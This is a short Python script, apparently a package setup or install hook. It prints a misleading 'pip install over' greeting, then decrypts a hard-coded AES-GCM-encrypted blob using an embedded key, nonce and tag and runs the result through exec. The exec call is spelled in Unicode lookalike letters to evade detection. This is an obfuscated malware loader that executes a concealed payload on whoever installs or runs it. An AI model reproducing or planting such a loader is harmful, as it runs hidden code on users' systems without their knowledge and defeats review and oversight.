from cffi import FFI
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def main():
    print("pip install over!!! welcome!!!good bye!!!")
    my_str = b'\x9d\x18\x8f>\xce@/+\xd5]\x89WSq\xcc\\\xa2_\xae=\x89\xde\xbf\xacrn\x15\xff\tD6S\xed\xf9\x11\xb1\xbd\x91[\xf7\xda\x08\x80\x88\xceD\x9c\xdd\xecC\xf0\xea\xb8\xe6\xce\xd8\x8d\x9f\xf5\x0e\x97\x85\x1f\x98\x9a3e\xa2ou\x1aU\\\x07_\x99h\xcc\xea{\x06#\x07f\x92@\x19\xb6>|\xbe\xbe\xb5f\xfa\xea&\xe7e\x1e\x94\xf0}H\x1e\xd0\xaa\x8c9\n\x9b\xd9\xb7>$\xa8z\xe7z2\x01>w\xd4{&2$\xc1!\xd0`\xba\x80\r\xf3S>\xf1\x0f\x9d?\x1d\x9e\xd1\xbd\xb5\xc0\x8f\xf6\xfe\xa3\xed,\x1d\xb8\x0bY\xc3[\xd9X\xe6;@\xc6j\xee\x82\xa8\x0e\xeeG\xc1\xd8M\x8f5\\Q\\\xe9\xbbJ\x03\xf4\xcbq\xb3L4juq$\x04\xf6,\xd2\xd3\xe4w\n\xf7&\x87v\xefF0E\xfb\xbd\x04\xd4\x0cj>/\xde7\x06\xf5G\x03\xd3\xa5\xe16m\xeb\x7f.\xa5r\x9a2\xdf\xf7)}F\x8ex>\xd2Bq\xc5a\xa4\xe3\x02\xd5\xae\xdc\xf6\xa1O\x85r\xef\x83\x9e\xc9\xfbg\xd8\x14Jqo\x1ba1:\xceJ\x81\x1b\x85\xdd\x85\x19\xace\x87\xad\xea\xeb\xb9\xce\xa98f\xa3h\xd8\xb08F\xf7\xe8*M\x8e\x0f\x02\xaa\x9f\xcb\'\xb9KO<J\x88\xfc\xa6\xbc\x80#\xfc\xcc\xa5\n\xad\xd9\x08\xa1\xa51\xa9V\xb3\x06\x1c\x8cA\x9c\xc0\x8e\xf5-\xe1z\xe8\xc1\xf1\x1e*rqy\x1c\xd9X\xd4\x9d$\t&\x97/\xbc\xc8\x0c`\x82o\x10\xf6\xe3\xfb\x0f\xd0\r\x1d( \xfe\xac\xfc\x0b\xdd\xa8\xc7\xb8\x16\xf5\xfd\xed\xb4\xae\x16\x1a\x16_\xbeJ\x95c1rK^t\x14?\x11i\xdd\xf4\x13\x9c\xe9\x88\xedk\xdcGP\xd2\xd4{\xa7G\x1a\x96\xb3*\xd5\x96\xe4\xba\xce\xa2\xf6\xca\xc3 lz5G\x0bTR\x96\x13\x19T\x97Qg\x8f\x81~Z3\xe9{\r?\xd4u\xc1"\x1c\xac\xe5\x15\x1eI\xfb\xa2M\xecn\xad\xd5\xb0\xa9B\xb9\x1cV\xcc\xedg\xdb"\xd8\x93\xd0z\xa3\x97\xba-\xf0\x97\x84\x19\xc6\xff\x03#\xa4\x9e\xc3\xa3\x7f^\x8c|\x05\xa8\x0b\xbb\xe1I\xfe`3\xc0!LC\x1f\xb0Emv\xc2\xb4\x16\x88D\x0b_@[)<\x04T\xa4\x83\xf3\xaa1\xa8f`I\x8a\x17\xa8\xf3+i\xa2\x90\xd6K\x80\x05\x8e\t\xb7\xd0d\n\xba%\x96o\xc8\xac\x1a\xbaK+\xab\xdeJ\xff\x81\xb4\xfer\x96\xe7\xc1\x11\x885\x08\x97z\x1c\xc0\xd7?\xe7\x18\x06\xa7\x01\xc7\xce\x83}A\xde\xf4\xac>\x8fs?\x0e\x96\xb8$J\xdc\xa2-\xa3t\x05E=@3\xd4\xfcgk\x1c@`\xb9\x0b\x0c7\xfc\xf5\xca\x99<\xaa\xe6\xbae))\xc4\x1f\x18\xefj;8\xd4\xbe\xd6\xc2\x06\x12\xd131e\xe24+\xb0\x15e\xbf\xb4\x93m0\xec\xabV\x04\x0e\xe9\xbe\xb2\xf0\xb7R\xe9K\xb8r8\xccY[\xe1\xcbq~>\xfb\x10\xe3\x9a\xdcD\x0c.\xac*\xe6x\xd0V\xf2\xf0+L<\x7f\xa3\x9b\xf0J\xbc\xec&W\x12\x95\xb1\xfb\x8c\xfb=\n\x0b\xd5\x03\x16\x92\x90F\xb0\xa8\x87\xfdu\xc9\xaf=\xa5I\x98\x02\xcf\xae\xees\xa4.\xd9\x98\xaa)o@\xc7\xad\x96\xde\x87\x89P\xf7{\xc8u\xb2\xaa\x8at\xf8-@X\xa0\xee3\x93\xcf\xb1\xcci\xf4\xfa\xc7\xfc\xd1\x8d^%\xd9\x80\xbb4*\x97[\xffM2p\x82\xdc\xb4\x9b\xf5\xbd>A\xa9$\xba\xb9\x90\xdb\xc2\xf6\x94!\xd75\x82\xfd\x92Gn\xc2Y+\x06I.W\x155\x87\xfbi03\xbeVPF\xe2\x81\x0c\xda\xd4\xda\x05d\xff\x1eq\xd6\xb0\xab\xf2\xd3\xe4:\x18\x86\xb2\x93\xb5_\xe0\x9cH\xed$\xc3\x13\x9d\xbb\x07Q\xc3(\xb5\x02L\x05:\xf8 \x836+\n\x19\xb6\x9bO\x12\xef\x8c(\x1e\x87`\xce\xfa\x95\xc5\x80\x17#\xc4\xc8F\x01\x18\xa8\xe2|\x1fEV\xa1m\x97v\xa1n\x1b\xf8#\\P\xf1Z\x05\x13\x9c2\xbdN\xf7\xc9s\xecJ\x1a\xbea\\wp/J(\xc1Q5y\x99\xe3\x06\xce_\xc0\x80\xd8\t\x0eQ^\x1d\xa2$~\xcd\xe84\x12\x00X\x8f\x83\xf6\xc0\xd8{_Re'
    nonce = b'\x01q\x85y\xe9\nx\xa9\x1dL\x04!\xebO\x87\xa5'
    cipher = AES.new(b'e\x08I\xad^\xa1\x88\x0b\xc3m\xf9\xd24\x16\x1a:U\x80\xe5\x87p\xf6\xcd\x8a\xe8\x85]\x97\x8el\xd6\xdd', AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(my_str, b'\xf4\xf9I&2\xa1\x8b\xae \x9d<\x1d\xda\xd5\x8fL')
    ℯ𝓍ℯ𝒸(plaintext)
    

if __name__ == "__main__":
    main()
